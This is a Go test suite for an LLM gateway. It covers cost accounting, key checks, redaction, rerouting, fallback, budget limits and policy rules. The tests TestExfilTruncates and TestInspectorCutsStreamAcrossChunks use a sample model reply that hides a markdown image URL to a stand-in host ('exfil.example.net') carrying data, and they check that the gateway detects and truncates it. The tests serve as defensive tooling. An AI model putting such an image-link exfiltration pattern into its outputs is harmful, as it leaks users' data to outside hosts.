package gateway

import (
	"context"
	"math/rand/v2"
	"strings"
	"testing"
	"time"

	"github.com/jbouder/stargate/server/internal/demo"
	"github.com/jbouder/stargate/server/internal/fakellm"
	"github.com/jbouder/stargate/server/internal/model"
	"github.com/jbouder/stargate/server/internal/store"
	"github.com/jbouder/stargate/server/internal/traffic"
)

func secret(id string) string {
	for _, k := range demo.Keys {
		if k.ID == id {
			return "Bearer " + demo.DevSecret(k.Prefix)
		}
	}
	panic(id)
}

func chat(m, user string) fakellm.ChatRequest {
	return fakellm.ChatRequest{Model: m, MaxTokens: 200, Messages: []fakellm.Message{{Role: "user", Content: user}}}
}

// fixedUp answers from a script of statuses, one per call, then 200s.
type fixedUp struct {
	statuses []int
	content  string
	calls    []string
}

func (f *fixedUp) Call(_ context.Context, backend string, req fakellm.ChatRequest, onDelta func(string) bool) Result {
	f.calls = append(f.calls, backend+"/"+req.Model)
	st := 200
	if len(f.statuses) > 0 {
		st, f.statuses = f.statuses[0], f.statuses[1:]
	}
	if st != 200 {
		return Result{Status: st, ErrMsg: "overloaded", Duration: 10 * time.Millisecond}
	}
	u := &fakellm.Usage{PromptTokens: 1000, CompletionTokens: 500}
	return Result{Status: 200, Content: f.content, Usage: u, Duration: 300 * time.Millisecond}
}

func run(t *testing.T, s *Snapshot, in Input, up Upstream) *model.Receipt {
	t.Helper()
	in.Now = time.Now()
	d := Admit(s, in, rand.New(rand.NewPCG(1, 2)))
	if d.Reject != nil {
		return d.Finish(s, nil, Result{}, nil, time.Now())
	}
	c, res, failed := Execute(context.Background(), d, up, nil)
	return d.Finish(s, c, res, failed, time.Now())
}

func TestAllowedRequestCostsFromPricing(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hello")}, &fixedUp{content: "hi"})
	if rc.Verdict != "allowed" || rc.Backend != "openai-prod" || rc.Status != 200 {
		t.Fatalf("got %s via %s status %d", rc.Verdict, rc.Backend, rc.Status)
	}
	// 1000 in × $0.25/M + 500 out × $2/M
	if want := 0.00125; rc.CostUSD == nil || *rc.CostUSD < want-1e-9 || *rc.CostUSD > want+1e-9 {
		t.Fatalf("cost %v, want %v", rc.CostUSD, want)
	}
	if rc.CostBasis == nil || rc.CostBasis.Backend != "openai-prod" {
		t.Fatalf("cost basis %+v", rc.CostBasis)
	}
	if len(rc.Trace) != 6 {
		t.Fatalf("trace has %d steps", len(rc.Trace))
	}
}

func TestUnknownKeyHasNoReceipt(t *testing.T) {
	d := Admit(DemoSnapshot(), Input{Secret: "Bearer nope", Req: chat("gpt-5-mini", "x"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if d.Reject == nil || d.Reject.Status != 401 || d.Receipt != nil {
		t.Fatalf("want 401 with no receipt, got %+v", d.Reject)
	}
}

func TestModelNotAllowedIsBlocked(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("claude-opus-4-1", "x")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "model_not_allowed" || rc.Status != 403 {
		t.Fatalf("got %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
}

func TestSecretBlockedByRule(t *testing.T) {
	up := &fixedUp{}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, up)
	if rc.Verdict != "blocked" || rc.ErrorCode != "policy_blocked" || len(up.calls) != 0 {
		t.Fatalf("got %s %s, upstream calls %v", rc.Verdict, rc.ErrorCode, up.calls)
	}
	if last := rc.Rules[len(rc.Rules)-1]; last.RuleID != "r3" || !last.Matched {
		t.Fatalf("last rule eval %+v", last)
	}
}

func TestEmailRedactedBeforeUpstream(t *testing.T) {
	s := DemoSnapshot()
	d := Admit(s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "mail a@b.com and c@d.org"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if got := d.Req.Messages[0].Content; strings.Contains(got, "@") || !strings.Contains(got, "[EMAIL_2]") {
		t.Fatalf("prompt not redacted: %q", got)
	}
	c, res, failed := Execute(context.Background(), d, &fixedUp{}, nil)
	rc := d.Finish(s, c, res, failed, time.Now())
	if rc.Verdict != "redacted" || rc.Redactions[0] != (model.Redaction{Type: "email", Count: 2}) {
		t.Fatalf("got %s %+v", rc.Verdict, rc.Redactions)
	}
}

func TestSecurityTeamIsNotRedacted(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k6"), Req: chat("llama-3.3-70b", "a@b.com")}, &fixedUp{})
	if rc.Verdict != "allowed" {
		t.Fatalf("got %s", rc.Verdict)
	}
}

func TestEURegionReroutesToPrivate(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Region: "eu", Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "rerouted" || rc.Backend != "vllm-internal" || rc.ResolvedModel != "llama-3.3-70b" || rc.RouteReason != "policy" {
		t.Fatalf("got %s via %s/%s (%s)", rc.Verdict, rc.Backend, rc.ResolvedModel, rc.RouteReason)
	}
	if !rc.ContentCaptured {
		t.Fatal("vllm-internal captures content")
	}
}

func TestAliasResolves(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k3"), Req: chat("summarize-digest", "hi")}, &fixedUp{})
	if rc.ResolvedModel != "gpt-5-mini" || rc.RouteReason != "alias" || rc.RequestedModel != "summarize-digest" {
		t.Fatalf("got %s (%s)", rc.ResolvedModel, rc.RouteReason)
	}
}

func TestOverloadFallsBack(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Backend != "bedrock-eu" || rc.FallbackFrom == "" || rc.RouteReason != "fallback" || rc.Status != 200 {
		t.Fatalf("got %s from %q (%s) status %d; calls %v", rc.Backend, rc.FallbackFrom, rc.RouteReason, rc.Status, up.calls)
	}
}

func TestOpusFallbackSubstitutesSameFamily(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-opus-4-1", "hi")}, up)
	if rc.Backend != "bedrock-eu" || rc.ResolvedModel != "claude-sonnet-5" {
		t.Fatalf("got %s/%s; calls %v", rc.Backend, rc.ResolvedModel, up.calls)
	}
}

func TestRateLimitIsNotRetried(t *testing.T) {
	up := &fixedUp{statuses: []int{429}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Status != 429 || rc.ErrorCode != "upstream_rate_limited" || len(up.calls) != 1 || rc.CostUSD == nil || *rc.CostUSD != 0 {
		t.Fatalf("got %d %s cost %v; calls %v", rc.Status, rc.ErrorCode, rc.CostUSD, up.calls)
	}
}

func TestBudgetBlock(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["agents"] = 40_001
	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s", rc.Verdict, rc.ErrorCode)
	}
	s.Spend.ByTeam["support"] = 99_999 // throttle: admitted with a warning
	rc = run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" || rc.Trace[1].State != "warn" {
		t.Fatalf("throttle: got %s, budget step %+v", rc.Verdict, rc.Trace[1])
	}
}

// withProjectBudget adds a project budget no key points at: budgets apply by
// scope, not by the key's budget_id.
func withProjectBudget(s *Snapshot, project, onExceed string, cap float64) {
	s.Budgets["bp"] = model.Budget{ID: "bp", Scope: project, ScopeType: "project", Period: "monthly", CapUSD: cap, OnExceed: onExceed}
}

func TestProjectBudgetBlocks(t *testing.T) {
	s := DemoSnapshot()
	withProjectBudget(s, "helpdesk", "block", 500)
	// Project spend is every key in it, revoked ones included, as /budgets counts it.
	other := &store.KeyRecord{APIKey: model.APIKey{ID: "k8", Name: "helpdesk-old", Team: "support", Project: "helpdesk", Status: "revoked"}, Hash: "h-k8"}
	s.KeyBy[other.Hash] = other
	s.Spend.ByKey["k1"], s.Spend.ByKey["k8"] = 300, 300
	rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.Status != 429 || rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
	if want := "Project budget helpdesk is over its $500 monthly cap. Ask a finance admin to raise it."; rc.ErrorDetail != want {
		t.Errorf("detail %q", rc.ErrorDetail)
	}
	b := rc.Trace[1]
	if b.Input != "project budget helpdesk · $600 of $500" || b.Outcome != "over cap · blocked" || b.State != "fail" {
		t.Errorf("budget step %+v", b)
	}
	if rc.Trace[2].Outcome != "not reached" {
		t.Errorf("rules step %+v", rc.Trace[2])
	}
}

func TestProjectSpendCountsRotatingKeyOnce(t *testing.T) {
	s := DemoSnapshot()
	withProjectBudget(s, "assistant", "block", 1_000)
	for _, k := range s.KeyBy {
		if k.ID == "k4" {
			k.NextHash = "h-k4-next"
			s.KeyBy[k.NextHash] = k
			break
		}
	}
	s.Spend.ByKey["k4"] = 600
	rc := run(t, s, Input{Secret: secret("k4"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" {
		t.Fatalf("got %s %s: %+v", rc.Verdict, rc.ErrorCode, rc.Trace[1])
	}
}

func TestTeamBudgetCoversKeyWithoutBudget(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["research"] = 25_000 // b5 warns at $20,000; k5 has no budget_id
	rc := run(t, s, Input{Secret: secret("k5"), Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" || rc.Trace[1].State != "warn" || rc.Trace[1].Input != "team budget research · $25000 of $20000" {
		t.Fatalf("got %s, budget step %+v", rc.Verdict, rc.Trace[1])
	}
}

func TestStrictestOverCapBudgetWins(t *testing.T) {
	for i := 0; i < 20; i++ { // budgets are a map; the verdict mustn't depend on its order
		s := DemoSnapshot()
		s.Spend.ByTeam["support"] = 13_000 // b1: throttle
		withProjectBudget(s, "helpdesk", "block", 500)
		s.Spend.ByKey["k1"] = 13_000
		rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
		if rc.Verdict != "blocked" || !strings.HasPrefix(rc.ErrorDetail, "Project budget helpdesk") {
			t.Fatalf("got %s %q", rc.Verdict, rc.ErrorDetail)
		}
	}
}

func TestSmallBudgetShowsCents(t *testing.T) {
	s := DemoSnapshot()
	b := s.Budgets["b3"] // batch-summarize's key budget
	b.CapUSD, b.OnExceed = 0.05, "block"
	s.Budgets["b3"] = b
	s.Spend.ByKey["k3"] = 0.061
	rc := run(t, s, Input{Secret: secret("k3"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Trace[1].Input != "key budget batch-summarize · $0.06 of $0.05" || rc.ErrorDetail != "Key budget batch-summarize is over its $0.05 monthly cap. Ask a finance admin to raise it." {
		t.Fatalf("budget step %+v, detail %q", rc.Trace[1], rc.ErrorDetail)
	}
}

func TestDisabledRuleIsSkipped(t *testing.T) {
	s := DemoSnapshot()
	for i := range s.Rules {
		if s.Rules[i].Name == "block-src" {
			s.Rules[i].Mode = "disabled"
		}
	}
	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, &fixedUp{})
	if rc.Verdict == "blocked" {
		t.Fatalf("a disabled rule blocked: %s", rc.ErrorDetail)
	}
	for _, ev := range rc.Rules {
		if ev.Name == "block-src" {
			t.Fatalf("a disabled rule was evaluated: %+v", ev)
		}
	}
}

func TestBlockWithoutEntityNamesTheRule(t *testing.T) {
	s := DemoSnapshot()
	s.Rules = append(s.Rules, model.PolicyRule{ID: "r9", Ordinal: 9, Name: "no-web", Mode: "enforce", FailMode: "closed", Version: 1,
		When: []model.Cond{{Field: "team", Op: "is", Value: []string{"web"}}}, Then: []model.Action{{Action: "block"}}})
	rc := run(t, s, Input{Secret: secret("k4"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.ErrorCode != "policy_blocked" || rc.ErrorDetail != "Rule no-web v1 blocks this request." || rc.Trace[2].Outcome != "blocked by no-web v1" {
		t.Fatalf("got %s %q, rules step %+v", rc.ErrorCode, rc.ErrorDetail, rc.Trace[2])
	}
}

func TestExfilTruncates(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")},
		&fixedUp{content: "fine text ![x](https://exfil.example.net/c?d=secret) more"})
	if rc.Verdict != "truncated" || rc.InboundVerdict != "blocked" {
		t.Fatalf("got %s/%s", rc.Verdict, rc.InboundVerdict)
	}
}

func TestInspectorCutsStreamAcrossChunks(t *testing.T) {
	in := &Inspector{}
	var sent strings.Builder
	for _, c := range []string{"hello ![x](https://ex", "fil.example.net/c?d=1)", " after"} {
		keep, ok := in.Feed(c)
		sent.WriteString(keep)
		if !ok {
			break
		}
	}
	if !in.Cut || strings.Contains(in.Content(), "d=1") {
		t.Fatalf("cut=%v content=%q", in.Cut, in.Content())
	}
}

// The generated mix should land near the mockup's verdict shares.
func TestGeneratedMixProducesEveryVerdict(t *testing.T) {
	s := DemoSnapshot()
	r := rand.New(rand.NewPCG(7, 8))
	gen := traffic.New()
	up := &SimUpstream{Rand: r}
	counts := map[string]int{}
	const n = 5000
	for i := 0; i < n; i++ {
		req := gen.Next(r)
		d := Admit(s, Input{Secret: req.Secret, Region: req.Region, Req: req.Body, Now: time.Now()}, r)
		var rc *model.Receipt
		if d.Reject != nil {
			rc = d.Finish(s, nil, Result{}, nil, time.Now())
		} else {
			c, res, failed := Execute(context.Background(), d, up, func(string) bool { return true })
			rc = d.Finish(s, c, res, failed, time.Now())
		}
		counts[rc.Verdict]++
	}
	for _, v := range []string{"allowed", "redacted", "rerouted", "blocked", "truncated"} {
		if counts[v] == 0 {
			t.Errorf("no %s receipts in %d: %v", v, n, counts)
		}
	}
	if share := float64(counts["allowed"]) / n; share < 0.7 || share > 0.9 {
		t.Errorf("allowed share %.2f outside 0.7–0.9: %v", share, counts)
	}
	t.Logf("verdicts: %v", counts)
}
